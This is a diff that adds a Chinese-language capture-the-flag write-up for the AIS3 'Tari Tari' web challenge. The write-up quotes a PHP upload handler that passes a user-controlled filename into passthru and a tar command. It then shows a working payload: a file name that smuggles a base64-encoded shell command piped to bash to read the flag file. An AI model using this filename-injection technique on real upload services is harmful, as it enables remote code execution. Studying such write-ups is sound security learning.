@@ -46,7 +46,29 @@ echo(`/rUn_M3_t0_9et_fL4g`);
 
 **Flag: 忘了留...**
 
-### 
+### Tari Tari
+1. 上傳 `trash.txt` 後，網頁提供的下載網址為 `http://chals1.ais3.org:9453/download.php?file=MjY1MDEwZmI2MDg2NGU1MGFjZTg5Y2RkYjE4ZmQxZjIudGFyLmd6&name=trash.txt.tar.gz`。把 `file` base64 decode 得到 `265010fb60864e50ace89cddb18fd1f2.tar.gz`，由此猜測 `file` 可以讀取任意檔案。
+2. 讀取 `index.php`，發現其使用 `passthru` 執行 shell command，而 `$filename` 為使用者可控，因此可以 RCE。
+```php
+$filename = $file['name'];
+$path = bin2hex(random_bytes(16)) . ".tar.gz";
+$source = substr($file['tmp_name'], 1);
+$destination = "./files/$path";
+passthru("tar czf '$destination' --transform='s|$source|$filename|' --directory='/tmp' '/$source'", $return);
+```
+3. 上傳檔案即可讀到 flag。
+```bash
+$ echo abc >  "'|| echo $(echo -n cat /y000000_i_am_the_f14GGG.txt | base64) | base64 -d | bash;#"
+$ ls
+total 32K
+-rw-r--r-- 1 ice1187 ice1187    0 May 15 18:16 ''\''|| echo Y2F0IC95MDAwMDAwX2lfYW1fdGhlX2YxNEdHRy50eHQ= | base64 -d | bash;#'
+```
+
+**Flag: `AIS3{test_flag (to be changed)}`**  (這個 flag 有夠迷惑...)
+
+### The Best Login UI
+
+
 
 ## Reverse
 
